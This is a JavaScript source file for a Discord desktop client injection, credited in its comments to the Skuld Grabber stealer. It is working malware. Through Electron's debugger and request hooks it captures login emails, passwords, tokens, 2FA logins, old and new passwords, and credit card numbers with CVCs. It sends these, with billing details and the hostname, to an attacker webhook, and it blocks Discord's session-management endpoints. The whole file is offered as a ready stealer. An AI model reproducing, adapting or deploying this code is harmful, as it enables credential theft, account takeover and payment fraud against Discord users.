// THIS ENTIRE INJECTION IS MADE FOR SKULD GRABBER.
// REPO: https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js

// I tried remaking the original one by rdimo but he used all old urls and stuff and I'm way too lazy to figure out the new ones so we're using this.
// Basically everything is the same but I removed a bit and reworked some other things.
// Besides that tho all credit goes to rdimo and hackirby (good job boys (or girls ion discriminate))

const os = require("os");
const https = require("https");
const querystring = require("querystring");
const { BrowserWindow, session } = require("electron");

const CONFIG = {
  webhook: "%webhook%",
  filters: {
    urls: [
      "/auth/login",
      "/auth/register",
      "/mfa/totp",
      "/mfa/codes-verification",
      "/users/@me",
    ],
  },
  filters2: {
    urls: [
      "wss://remote-auth-gateway.discord.gg/*",
      "https://discord.com/api/v*/auth/sessions",
      "https://*.discord.com/api/v*/auth/sessions",
      "https://discordapp.com/api/v*/auth/sessions",
    ],
  },
  payment_filters: {
    urls: [
      "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts",
      "https://api.stripe.com/v*/tokens",
    ],
  },
  API: "https://discord.com/api/v9/users/@me",
  badges: {
    Discord_Emloyee: {
      Value: 1,
      Emoji: "<:8485discordemployee:1163172252989259898>",
      Rare: true,
    },
    Partnered_Server_Owner: {
      Value: 2,
      Emoji: "<:9928discordpartnerbadge:1163172304155586570>",
      Rare: true,
    },
    HypeSquad_Events: {
      Value: 4,
      Emoji: "<:9171hypesquadevents:1163172248140660839>",
      Rare: true,
    },
    Bug_Hunter_Level_1: {
      Value: 8,
      Emoji: "<:4744bughunterbadgediscord:1163172239970140383>",
      Rare: true,
    },
    Early_Supporter: {
      Value: 512,
      Emoji: "<:5053earlysupporter:1163172241996005416>",
      Rare: true,
    },
    Bug_Hunter_Level_2: {
      Value: 16384,
      Emoji: "<:1757bugbusterbadgediscord:1163172238942543892>",
      Rare: true,
    },
    Early_Verified_Bot_Developer: {
      Value: 131072,
      Emoji: "<:1207iconearlybotdeveloper:1163172236807639143>",
      Rare: true,
    },
    House_Bravery: {
      Value: 64,
      Emoji: "<:6601hypesquadbravery:1163172246492287017>",
      Rare: false,
    },
    House_Brilliance: {
      Value: 128,
      Emoji: "<:6936hypesquadbrilliance:1163172244474822746>",
      Rare: false,
    },
    House_Balance: {
      Value: 256,
      Emoji: "<:5242hypesquadbalance:1163172243417858128>",
      Rare: false,
    },
    Active_Developer: {
      Value: 4194304,
      Emoji: "<:1207iconactivedeveloper:1163172534443851868>",
      Rare: false,
    },
    Certified_Moderator: {
      Value: 262144,
      Emoji: "<:4149blurplecertifiedmoderator:1163172255489085481>",
      Rare: true,
    },
    Spammer: {
      Value: 1048704,
      Emoji: "⌨️",
      Rare: false,
    },
  },
};

const executeJS = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

const getToken = async () =>
  await executeJS(
    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`
  );

const request = async (method, url, headers, data) => {
  url = new URL(url);
  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: method,
    headers: {
      "Access-Control-Allow-Origin": "*",
    },
  };

  if (url.search) options.path += url.search;
  for (const key in headers) options.headers[key] = headers[key];
  const req = https.request(options);
  if (data) req.write(data);
  req.end();

  return new Promise((resolve, reject) => {
    req.on("response", (res) => {
      let data = "";
      res.on("data", (chunk) => (data += chunk));
      res.on("end", () => resolve(data));
    });
  });
};

const hooker = async (content, token, account) => {
  const nitro = getNitro(account.premium_type);
  const badges = getBadges(account.flags);
  const billing = await getBilling(token);

  const date_and_time = new Date().toLocaleString("en-US", {
    timeZone: "America/Chicago",
  });

  var date = date_and_time.split(", ")[0];

  var time = date_and_time.split(", ")[1];
  +" CST";

  content["hostname"] = os.hostname();

  content["date"] = date;
  content["time"] = time;

  content["discord"] = {
    nitro: nitro,
    token: token,
    badges: badges,
    billing: billing,
  };

  var url = new URL(CONFIG.webhook);

  var options = {
    hostname: url.hostname,
    port: url.port,
    path: url.pathname,
    method: "POST",
    rejectUnauthorized: false, // This is needed cause we got self signed certs :sad:
  };

  const sendRequest = async (options, content) => {
    return new Promise((resolve, reject) => {
      const req = https.request(options, (res) => {
        console.log(`statusCode: ${res.statusCode}`);

        let data = "";
        res.on("data", (chunk) => {
          data += chunk;
        });

        res.on("end", () => {
            if (res.statusCode === 200 || res.statusCode === 429) {
            resolve(data);
          } else {
            reject(new Error(`Request failed with status code ${res.statusCode}`));
          }
        });
      });

      req.on("error", (error) => {
        reject(error);
      });

      req.write(JSON.stringify(content));
      req.end();
    });
  };

  const sendRequestUntilSuccess = async (options, content) => {
    let response;
    const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

    while (true) {
      try {
      response = await sendRequest(options, content);
      break;
      } catch (error) {
      console.error(error);
      await delay(10000);
      }
    }
    return response;
  };

  await sendRequestUntilSuccess(options, content);
  return;
};

const fetch = async (endpoint, headers) => {
  return JSON.parse(await request("GET", CONFIG.API + endpoint, headers));
};

const fetchAccount = async (token) =>
  await fetch("", {
    Authorization: token,
  });
const fetchBilling = async (token) =>
  await fetch("/billing/payment-sources", {
    Authorization: token,
  });

const getNitro = (flags) => {
  switch (flags) {
    case 1:
      return "`Nitro Classic`";
    case 2:
      return "`Nitro Boost`";
    case 3:
      return "`Nitro Basic`";
    default:
      return "`❌`";
  }
};

const getBadges = (flags) => {
  let badges = "";
  for (const badge in CONFIG.badges) {
    let b = CONFIG.badges[badge];
    if ((flags & b.Value) == b.Value) badges += b.Emoji + " ";
  }
  return badges || "`❌`";
};

const getBilling = async (token) => {
  const data = await fetchBilling(token);
  let billing = "";
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += "💳 ";
          break;
        case 2:
          billing += "<:paypal:1148653305376034967> ";
          break;
      }
    }
  });
  return billing || "`❌`";
};

const EmailPassToken = async (email, password, token, action) => {
  const account = await fetchAccount(token);

  const content = {
    reason: "idk ngl", // I'm too lazy to add new backend stuff for all the reasons 1 is good
    username: account.username,
    special_fields: [
      {
        email: email,
        password: password,
      },
    ],
  };

  hooker(content, token, account);
};

//reason: `2FA`,
//username: account.username,
//password: password,

const PasswordChanged = async (newPassword, oldPassword, token) => {
  const account = await fetchAccount(token);

  const content = {
    reason: `Password changed`,
    username: account.username,
    special_fields: [
      {
        new_password: newPassword,
        old_password: oldPassword,
      },
    ],
  };

  hooker(content, token, account);
};

const CreditCardAdded = async (number, cvc, month, year, token) => {
  const account = await fetchAccount(token);

  const content = {
    reason: `Credit card added`,
    username: account.username,
    special_fields: [
      {
        number: number,
        cvc: cvc,
        month: month,
        year: year,
      },
    ],
  };

  hooker(content, token, account);
};

const PaypalAdded = async (token) => {
  const account = await fetchAccount(token);

  const content = {
    reason: `Paypal added`,
    username: account.username,
    special_fields: [],
  };

  hooker(content, token, account);
};

let email = "";
let password = "";
const createWindow = () => {
  mainWindow = BrowserWindow.getAllWindows()[0];
  if (!mainWindow) return;

  mainWindow.webContents.debugger.attach("1.3");
  mainWindow.webContents.debugger.on("message", async (_, method, params) => {
    if (method !== "Network.responseReceived") return;
    if (!CONFIG.filters.urls.some((url) => params.response.url.endsWith(url)))
      return;
    if (![200, 202].includes(params.response.status)) return;

    const responseUnparsedData =
      await mainWindow.webContents.debugger.sendCommand(
        "Network.getResponseBody",
        {
          requestId: params.requestId,
        }
      );
    const responseData = JSON.parse(responseUnparsedData.body);

    const requestUnparsedData =
      await mainWindow.webContents.debugger.sendCommand(
        "Network.getRequestPostData",
        {
          requestId: params.requestId,
        }
      );
    const requestData = JSON.parse(requestUnparsedData.postData);

    switch (true) {
      case params.response.url.endsWith("/login"):
        if (!responseData.token) {
          email = requestData.login;
          password = requestData.password;
          return; // 2FA
        }
        EmailPassToken(
          requestData.login,
          requestData.password,
          responseData.token,
          "logged in"
        );
        break;

      case params.response.url.endsWith("/register"):
        EmailPassToken(
          requestData.email,
          requestData.password,
          responseData.token,
          "signed up"
        );
        break;

      case params.response.url.endsWith("/totp"):
        EmailPassToken(
          email,
          password,
          responseData.token,
          "logged in with 2FA"
        );
        break;

      case params.response.url.endsWith("/@me"):
        if (!requestData.password) return;

        if (requestData.email) {
          EmailPassToken(
            requestData.email,
            requestData.password,
            responseData.token,
            "changed his email to **" + requestData.email + "**"
          );
        }

        if (requestData.new_password) {
          PasswordChanged(
            requestData.new_password,
            requestData.password,
            responseData.token
          );
        }
        break;
    }
  });

  mainWindow.webContents.debugger.sendCommand("Network.enable");

  mainWindow.on("closed", () => {
    createWindow();
  });
};
createWindow();

session.defaultSession.webRequest.onCompleted(
  CONFIG.payment_filters,
  async (details, _) => {
    if (![200, 202].includes(details.statusCode)) return;
    if (details.method != "POST") return;
    switch (true) {
      case details.url.endsWith("tokens"):
        const item = querystring.parse(
          Buffer.from(details.uploadData[0].bytes).toString()
        );
        CreditCardAdded(
          item["card[number]"],
          item["card[cvc]"],
          item["card[exp_month]"],
          item["card[exp_year]"],
          await getToken()
        );
        break;

      case details.url.endsWith("paypal_accounts"):
        PaypalAdded(await getToken());
        break;
    }
  }
);

session.defaultSession.webRequest.onBeforeRequest(
  CONFIG.filters2,
  (details, callback) => {
    if (
      details.url.startsWith("wss://remote-auth-gateway") ||
      details.url.endsWith("auth/sessions")
    )
      return callback({
        cancel: true,
      });
  }
);

module.exports = require("./core.asar");

